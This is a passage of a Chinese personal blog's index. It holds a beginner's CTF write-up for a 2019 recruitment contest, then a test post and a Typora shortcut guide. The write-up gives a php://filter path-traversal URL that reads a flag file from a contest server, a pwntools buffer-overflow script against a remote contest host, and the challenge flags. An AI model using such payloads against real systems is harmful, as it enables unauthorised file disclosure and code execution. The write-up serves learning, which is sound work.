class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hi hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bisque<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登陆<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>hint:admin用户的密码似乎在某个页面里 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>flag:  <code>Asuri{Burp_1s_Gre@t}</code></p><blockquote><p>其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。<br>然而我现场还在搜它怎么用……</p></blockquote><h2 id="hard-web-php是世界上最好的语言"><a href="#hard-web-php是世界上最好的语言" class="headerlink" title="hard_web_php是世界上最好的语言"></a>hard_web_php是世界上最好的语言</h2><p> <a href="http://139.9.212.218:39009/" target="_blank" rel="noopener">http://139.9.212.218:39009/</a> </p><p>改cookie重发</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212633273.png" alt="image-20191117212633273"></p><p>访问<code>read_file.php</code>，得到  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212728303.png" alt="image-20191117212728303"></p><p>访问<code>no_flag_here.php</code>  ，构造参数进入根目录  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117203840679.png" alt="image-20191117203840679"></p><p>然而！emmm这个scandir怎么获取这个flag文件内容啊！！！</p><blockquote><p>看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 </p></blockquote><p>构造<code>file=php://filter/read=convert.base64-encode/resource=</code>+绝对路径</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php</a></p><p>或者</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php</a></p><p>得到一串Base64字符串</p><p><code>PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg==</code>  </p><p>解码后：</p><pre class=" language-PHP"><code class="language-PHP"><?php    //Asuri{WEB_WINNER}?></code></pre><p>flag: <code>Asuri{WEB_WINNER}</code></p><h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212839633.png" alt="image-20191117212839633"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213445330.png" alt="image-20191117213445330"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212904694.png" alt="image-20191117212904694"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment" spellcheck="true"># 引入pwntools库</span><span class="token keyword">import</span> timesh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.235.243.206'</span><span class="token punctuation">,</span> <span class="token number">9001</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建与靶场服务器的连接</span>offset <span class="token operator">=</span> <span class="token number">0x60</span><span class="token operator">+</span><span class="token number">0x8</span>  <span class="token comment" spellcheck="true"># 偏移</span>system_addr <span class="token operator">=</span> <span class="token number">0x400766</span>  <span class="token comment" spellcheck="true"># system函数地址</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your passworld size'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your password'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> offset <span class="token operator">*</span> b<span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 构造攻击数据</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 将控制流从程序转移到自己这里</span></code></pre><p>完了不会写，嘤嘤嘤</p><h2 id="medium-rev"><a href="#medium-rev" class="headerlink" title="medium_rev"></a>medium_rev</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token comment" spellcheck="true"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span><span class="token keyword">def</span> <span class="token function">encrypt_for_each</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">100</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">77</span>        <span class="token keyword">yield</span> tmp        None<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    iters <span class="token operator">=</span> encrypt_for_each<span class="token punctuation">(</span><span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> zip<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> m <span class="token operator">^</span> k <span class="token operator">^</span> iters<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>        enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> enc<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">check_prime</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> num <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    test <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">8</span><span class="token punctuation">,</span>        <span class="token number">61</span><span class="token punctuation">,</span>        <span class="token number">85</span><span class="token punctuation">,</span>        <span class="token number">25</span><span class="token punctuation">,</span>        <span class="token number">121</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">26</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">81</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">124</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">137</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">94</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">132</span><span class="token punctuation">,</span>        <span class="token number">90</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">46</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">127</span><span class="token punctuation">,</span>        <span class="token number">35</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">134</span><span class="token punctuation">,</span>        <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token number">73</span><span class="token punctuation">,</span>        <span class="token number">32</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">7</span><span class="token punctuation">,</span>        <span class="token number">69</span><span class="token punctuation">,</span>        <span class="token number">122</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">142</span><span class="token punctuation">,</span>        <span class="token number">23</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">109</span><span class="token punctuation">,</span>        <span class="token number">60</span><span class="token punctuation">,</span>        <span class="token number">79</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">62</span><span class="token punctuation">,</span>        <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token number">104</span><span class="token punctuation">,</span>        <span class="token number">102</span><span class="token punctuation">,</span>        <span class="token number">14</span><span class="token punctuation">,</span>        <span class="token number">58</span><span class="token punctuation">,</span>        <span class="token number">149</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">96</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">114</span><span class="token punctuation">,</span>        <span class="token number">116</span><span class="token punctuation">,</span>        <span class="token number">11</span><span class="token punctuation">,</span>        <span class="token number">95</span><span class="token punctuation">,</span>        <span class="token number">87</span><span class="token punctuation">,</span>        <span class="token number">146</span><span class="token punctuation">,</span>        <span class="token number">123</span><span class="token punctuation">,</span>        <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token number">135</span><span class="token punctuation">,</span>        <span class="token number">33</span><span class="token punctuation">,</span>        <span class="token number">37</span><span class="token punctuation">,</span>        <span class="token number">110</span><span class="token punctuation">,</span>        <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token number">106</span><span class="token punctuation">,</span>        <span class="token number">30</span><span class="token punctuation">,</span>        <span class="token number">130</span><span class="token punctuation">,</span>        <span class="token number">101</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">98</span><span class="token punctuation">,</span>        <span class="token number">141</span><span class="token punctuation">,</span>        <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token number">47</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">24</span><span class="token punctuation">,</span>        <span class="token number">131</span><span class="token punctuation">,</span>        <span class="token number">16</span><span class="token punctuation">,</span>        <span class="token number">111</span><span class="token punctuation">,</span>        <span class="token number">150</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">76</span><span class="token punctuation">,</span>        <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token number">138</span><span class="token punctuation">,</span>        <span class="token number">64</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">118</span><span class="token punctuation">,</span>        <span class="token number">29</span><span class="token punctuation">,</span>        <span class="token number">145</span><span class="token punctuation">,</span>        <span class="token number">147</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">113</span><span class="token punctuation">,</span>        <span class="token number">103</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">92</span><span class="token punctuation">,</span>        <span class="token number">71</span><span class="token punctuation">,</span>        <span class="token number">72</span><span class="token punctuation">,</span>        <span class="token number">129</span><span class="token punctuation">,</span>        <span class="token number">139</span><span class="token punctuation">,</span>        <span class="token number">100</span><span class="token punctuation">,</span>        <span class="token number">63</span><span class="token punctuation">,</span>        <span class="token number">133</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">125</span><span class="token punctuation">,</span>        <span class="token number">74</span><span class="token punctuation">,</span>        <span class="token number">88</span><span class="token punctuation">,</span>        <span class="token number">143</span><span class="token punctuation">,</span>        <span class="token number">144</span><span class="token punctuation">,</span>        <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token number">140</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">136</span><span class="token punctuation">,</span>        <span class="token number">115</span><span class="token punctuation">,</span>        <span class="token number">54</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">50</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">128</span><span class="token punctuation">,</span>        <span class="token number">57</span><span class="token punctuation">,</span>        <span class="token number">112</span><span class="token punctuation">,</span>        <span class="token number">43</span><span class="token punctuation">,</span>        <span class="token number">84</span><span class="token punctuation">,</span>        <span class="token number">70</span><span class="token punctuation">,</span>        <span class="token number">78</span><span class="token punctuation">,</span>        <span class="token number">28</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">93</span><span class="token punctuation">,</span>        <span class="token number">44</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">83</span><span class="token punctuation">,</span>        <span class="token number">65</span><span class="token punctuation">,</span>        <span class="token number">17</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">,</span>        <span class="token number">126</span><span class="token punctuation">,</span>        <span class="token number">39</span><span class="token punctuation">,</span>        <span class="token number">49</span><span class="token punctuation">,</span>        <span class="token number">91</span><span class="token punctuation">,</span>        <span class="token number">34</span><span class="token punctuation">,</span>        <span class="token number">82</span><span class="token punctuation">,</span>        <span class="token number">45</span><span class="token punctuation">,</span>        <span class="token number">148</span><span class="token punctuation">,</span>        <span class="token number">105</span><span class="token punctuation">,</span>        <span class="token number">89</span><span class="token punctuation">,</span>        <span class="token number">117</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">continue</span><span class="token punctuation">[</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>filter<span class="token punctuation">(</span>check_prime<span class="token punctuation">,</span> test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">167</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">166</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">233</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">179</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'encryt message is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>lambda .0: continue[ i for i in .0 ]</code> 这个<code>.0</code>执行不了啊emmm</p><p>我换成x也报错唉！</p><h2 id="middle-pwn"><a href="#middle-pwn" class="headerlink" title="middle_pwn"></a>middle_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213404793.png" alt="image-20191117213404793"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213417542.png" alt="image-20191117213417542"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/%E6%A6%9C%E5%8D%95.png" alt="榜单.png"> </p><p>第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233  </p><p>除了石榴园的真的没多少打这个比赛的呀。  </p><p>我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤    </p><p>现场查BurpSuite怎么用也是绝了（那节培训我没去emmm   </p><p>总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ </p><blockquote><p><del>等我有空再折腾一下，搭个博客吧 咕咕咕</del></p></blockquote><blockquote><p>20191128 更新：<br>我来折腾了，嘻嘻嘻！   </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2019/11/28/test/"/>
      <url>/2019/11/28/test/</url>
      
        <content type="html"><![CDATA[<h1 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h1><p>再来一下哈~</p><p>喵~~<br><strong>嘿嘿嘿</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora_tips 一些关于typora的快捷键</title>
      <link href="/2019/08/29/typora_tips/"/>
      <url>/2019/08/29/typora_tips/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>​        随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h2><p><code>ctrl + 数字键</code></p><p>最多支持到六级标题</p><blockquote><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1></blockquote><blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2></blockquote><blockquote><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3></blockquote><blockquote><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4></blockquote><blockquote><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5></blockquote><blockquote><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6></blockquote><h3 id="取消标题"><a href="#取消标题" class="headerlink" title="取消标题"></a><strong>取消标题</strong></h3><p>​    <code>ctrl + 数字0</code></p><blockquote><h5 id="标题-1"><a href="#标题-1" class="headerlink" title="标题"></a>标题</h5><p>取消标题</p></blockquote><h2 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a><strong>加粗</strong></h2><p><code>ctrl + B</code></p><blockquote><p><strong>这是加粗</strong></p></blockquote><h2 id="倾斜"><a href="#倾斜" class="headerlink" title="倾斜"></a><strong>倾斜</strong></h2><p><code>ctrl + I</code></p><blockquote><p><em>这是倾斜</em></p></blockquote><h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a><strong>下划线</strong></h2><p><code>ctrl + U</code></p><blockquote><p><u>这是下划线</u></p></blockquote><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a><strong>删除线</strong></h2><p><code>alt + shift + 5</code></p><blockquote><p><del>这是删除线</del></p></blockquote><hr><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a><strong>无序列表</strong></h2> <a id="more"></a> <p><code>- + space + enter</code></p><blockquote><ul><li><p>miao </p></li><li><p>miaomiao!</p><ul><li><p>嵌套</p><ul><li>再来嵌套</li></ul></li><li><p>上一个层次</p></li></ul></li><li><p>喵！</p></li></ul></blockquote><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a><strong>有序列表</strong></h2><p><code>数字键. + space + enter</code></p><ol><li>第一个</li><li>第二个<ol><li>嵌套一下</li><li>再来一下<ol><li>再嵌套一个</li></ol></li><li>继续</li></ol></li><li>继续来</li><li>就这样吧</li></ol><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a><strong>任务列表</strong></h2><p><code>- []</code> TODO</p><p><code>- [x]</code>已完成</p><blockquote><ul><li><input disabled type="checkbox"> 这是待完成的</li><li><input checked disabled type="checkbox"> 这个已完成了</li></ul></blockquote><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a><strong>引用</strong></h2><p><code>&gt; + space + enter</code></p><p>或者</p><p><code>ctrl + shift + Q</code></p><blockquote><p>这就是引用</p></blockquote><blockquote><p>这也是</p><blockquote><p>​    还可以嵌套引用</p><blockquote><p>​    再来一个</p></blockquote><p>这也行</p></blockquote><p>一样的</p></blockquote><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a><strong>插入图片</strong></h2><p><code>ctrl + shift + I</code></p><p>网上说用<code>MPic</code>做图床挺不错的。（还没试过</p><p><img src="/2019/08/29/typora_tips/cat.jpg" alt="喵啊"></p><p>直接拖进来也行</p><h2 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a><strong>插入链接</strong></h2><p><code>ctrl + K</code></p><blockquote><p><a href="https://miaotony.github.io" target="_blank" rel="noopener">这是链接，跳转到我的博客哈</a></p></blockquote><h2 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a><strong>插入表格</strong></h2><p><code>ctrl + T</code></p><table><thead><tr><th>mm</th><th>text</th></tr></thead><tbody><tr><td>测试</td><td>再测试</td></tr><tr><td>123</td><td>456</td></tr></tbody></table><h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a><strong>插入代码</strong></h2><h3 id="单行代码（文中的代码）"><a href="#单行代码（文中的代码）" class="headerlink" title="单行代码（文中的代码）"></a>单行代码（文中的代码）</h3><p>ctrl + shift + `</p><blockquote><p>`输入代码`</p></blockquote><h3 id="多行代码（代码块）"><a href="#多行代码（代码块）" class="headerlink" title="多行代码（代码块）"></a>多行代码（代码块）</h3><p><code>ctrl + shift + K</code></p><blockquote><p>``` </p><p>输入代码</p><p>```</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Python</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, this is C."</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// C</span></code></pre><pre class=" language-matlab"><code class="language-matlab"><span class="token function">disp</span><span class="token punctuation">(</span>"Hello<span class="token punctuation">,</span> this is MATLAB<span class="token punctuation">.</span>"<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">% MATLAB</span></code></pre><pre class=" language-lua"><code class="language-lua"><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello, this is lua."</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">-- lua</span></code></pre><h2 id="插入表情"><a href="#插入表情" class="headerlink" title="插入表情"></a><strong>插入表情</strong></h2><p><code>:名称:</code></p><p>(英文状态下)</p><p>:cat: :dog:</p><p><img src="/2019/08/29/typora_tips/1.png" alt="示例"></p><p>PS：微软输入法可以用<code>ctrl + shift + B</code>弹出表情窗口。</p><p>😀👌</p><h2 id="插入分割线"><a href="#插入分割线" class="headerlink" title="插入分割线"></a><strong>插入分割线</strong></h2><p><code>---</code></p><blockquote><p>下面是分割线</p><hr></blockquote><h2 id="插入高亮显示"><a href="#插入高亮显示" class="headerlink" title="插入高亮显示"></a><strong>插入高亮显示</strong></h2><p><code>==中间写文字==</code></p><blockquote><p>==这是高亮==</p></blockquote><h2 id="插入脚注"><a href="#插入脚注" class="headerlink" title="插入脚注"></a><strong>插入脚注</strong></h2><p><code>文字[^脚注]</code></p><blockquote><p>示例<a href="这是脚注啦。">^1</a></p></blockquote><h2 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a><strong>插入公式</strong></h2><p><code>ctrl + shift + M</code></p><p>或者</p><p>行内公式（内联公式）：  <code>$公式$</code></p><p>行间公式：     <code>$$ 公式 